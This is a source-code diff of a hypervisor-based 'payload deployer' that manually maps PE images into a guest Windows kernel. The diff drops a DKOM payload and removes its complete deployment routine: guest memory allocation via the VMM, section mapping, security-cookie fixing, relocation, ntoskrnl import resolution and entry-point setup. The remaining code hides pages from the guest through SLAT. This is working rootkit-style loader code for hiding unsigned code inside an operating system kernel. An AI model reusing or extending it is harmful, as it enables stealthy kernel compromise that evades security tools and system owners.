@@ -1,6 +1,6 @@
 // =============================================================================
 // VMM Shadow Mapper - Payload Deployer
-// Coordinates loading of DKOM and RWbase payloads
+// Coordinates loading of RWbase payloads
 // =============================================================================
 
 #include "deployer.h"
@@ -95,10 +95,9 @@ bool validate_payload(const unsigned char* data, const size_t size)
  */
 bool is_payload_ready()
 {
-    // 业务说明：验证 DKOM 与 RWbase 两个 Payload 的 PE 合法性。
-    // 输入：无；输出：是否就绪；规则：两者都合法才返回 true；异常：不抛出。
-    return validate_payload(payload::dkom_image, payload::dkom_image_size) &&
-           validate_payload(payload::rwbase_image, payload::rwbase_image_size);
+    // 业务说明：验证 RWbase Payload 的 PE 合法性。
+    // 输入：无；输出：是否就绪；规则：合法才返回 true；异常：不抛出。
+    return validate_payload(payload::rwbase_image, payload::rwbase_image_size);
 }
 
 // =============================================================================
@@ -112,7 +111,7 @@ bool is_payload_ready()
  * image base, entry point, and section count. If the payload is a valid PE
  * file, it also logs the first 64 bytes of the payload for integrity checking.
  * 
- * @param name Name of the payload (e.g., "DKOM" or "RWbase")
+ * @param name Name of the payload (e.g., "RWbase")
  * @param data Pointer to the payload data
  * @param size Size of the payload data in bytes
  */
@@ -124,7 +123,7 @@ bool is_payload_ready()
  * @return {void} 无返回值。
  * @throws {无} 不抛出异常。
  * @example
- * print_payload_info("DKOM", payload, size);
+ * print_payload_info("RWbase", payload, size);
  */
 void print_payload_info(const char* name, const unsigned char* data, const size_t size)
 {
@@ -388,112 +387,6 @@ static bool hide_pages_via_slat(const uint64_t guest_physical, const uint32_t si
     // }
     
     return true;
-}
-
-// =============================================================================
-// DKOM Deployment
-// =============================================================================
-
-/**
- * @description 部署 DKOM Payload 并准备执行环境。
- * @param {const uint64_t} ntoskrnl_base 来宾 ntoskrnl 基址。
- * @return {deploy_result_t} 部署结果。
- * @throws {无} 不抛出异常。
- * @example
- * const auto result = deploy_dkom_payload(nt_base);
- */
-deploy_result_t deploy_dkom_payload(const uint64_t ntoskrnl_base)
-{
-    // 业务说明：完成 DKOM Payload 的验证、分配、映射与重定位导入处理。
-    // 输入：ntoskrnl_base；输出：部署结果；规则：任一步失败返回对应错误；异常：不抛出。
-    logs::print("[Loader] ========================================\n");
-    logs::print("[Loader] DKOM Payload Deployment Starting\n");
-    logs::print("[Loader] ========================================\n");
-
-    // Initialize Guest discovery if not already done
-    if (!g_module_cache.initialized) {
-        // Set Guest/SLAT CR3 for module discovery
-        set_discovery_slat_cr3(slat::hyperv_cr3());
-        set_discovery_cr3(arch::get_guest_cr3());
-        
-        if (!init_guest_discovery(ntoskrnl_base)) {
-            logs::print("[Loader] WARNING: Guest discovery init failed\n");
-        }
-    }
-
-    // Validate payload
-    if (!validate_payload(payload::dkom_image, payload::dkom_image_size)) {
-        logs::print("[Loader] ERROR: Invalid DKOM payload\n");
-        return deploy_result_t::invalid_payload;
-    }
-
-    print_payload_info("DKOM", payload::dkom_image, payload::dkom_image_size);
-
-    // Get size of image from PE headers
-    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::dkom_image);
-    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(
-        payload::dkom_image + dos->e_lfanew
-    );
-    const uint32_t image_size = nt->optional_header.size_of_image;
-
-    // Allocate Guest-accessible memory
-    allocation_info_t alloc = {};
-    if (!allocate_guest_memory(image_size, &alloc)) {
-        logs::print("[Loader] ERROR: Failed to allocate Guest memory for DKOM\n");
-        return deploy_result_t::memory_allocation_failed;
-    }
-
-    logs::print("[Loader] DKOM allocation: Guest PA=0x%p, Guest VA=0x%p, VMM=0x%p\n",
-        alloc.guest_physical_base, alloc.guest_virtual_base, alloc.vmm_mapped_address);
-
-    // Zero the destination (via VMM pointer)
-    crt::set_memory(alloc.vmm_mapped_address, 0, image_size);
-
-    // Map sections (write to VMM pointer)
-    logs::print("[Loader] Mapping PE sections...\n");
-    if (!map_sections(alloc.vmm_mapped_address, payload::dkom_image, payload::dkom_image_size)) {
-        logs::print("[Loader] ERROR: Failed to map sections\n");
-        return deploy_result_t::invalid_payload;
-    }
-
-    // CRITICAL: Relocations and imports use Guest VA, not VMM VA
-    const uint64_t target_va = alloc.guest_virtual_base;
-
-    // Step 1: Fix security cookie (uses Guest VA for calculation)
-    logs::print("[Loader] Fixing security cookie (target VA: 0x%p)...\n", target_va);
-    if (!fix_security_cookie(alloc.vmm_mapped_address, target_va)) {
-        logs::print("[Loader] WARNING: Security cookie fix failed (may be non-fatal)\n");
-    }
-
-    // Step 2: Apply relocations (patch VMM memory, but use Guest VA as base)
-    logs::print("[Loader] Applying relocations (base: 0x%p)...\n", target_va);
-    if (!apply_relocations(alloc.vmm_mapped_address, target_va)) {
-        logs::print("[Loader] ERROR: Relocation failed\n");
-        return deploy_result_t::relocation_failed;
-    }
-
-    // Step 3: Resolve imports (use Guest ntoskrnl base)
-    logs::print("[Loader] Resolving imports (ntoskrnl=0x%p)...\n", ntoskrnl_base);
-    if (!resolve_payload_imports(alloc.vmm_mapped_address, ntoskrnl_base)) {
-        logs::print("[Loader] ERROR: Import resolution failed\n");
-        return deploy_result_t::import_resolution_failed;
-    }
-
-    // Calculate entry point (Guest VA)
-    const uint32_t entry_rva = get_entry_point_rva(alloc.vmm_mapped_address);
-    const uint64_t entry_va = target_va + entry_rva;
-
-    logs::print("[Loader] DKOM ready for execution at EP: 0x%p (Guest VA)\n", entry_va);
-
-    // TODO: Execute entry point
-    // This requires setting Guest RIP to entry_va at an appropriate VMExit
-    // For DKOM (one-shot), after execution we zero the memory
-    
-    logs::print("[Loader] DKOM deployment complete (execution pending)\n");
-    logs::print("[Loader] After execution, zero %d bytes at VMM 0x%p\n", 
-        image_size, alloc.vmm_mapped_address);
-
-    return deploy_result_t::success;
 }
 
 // =============================================================================
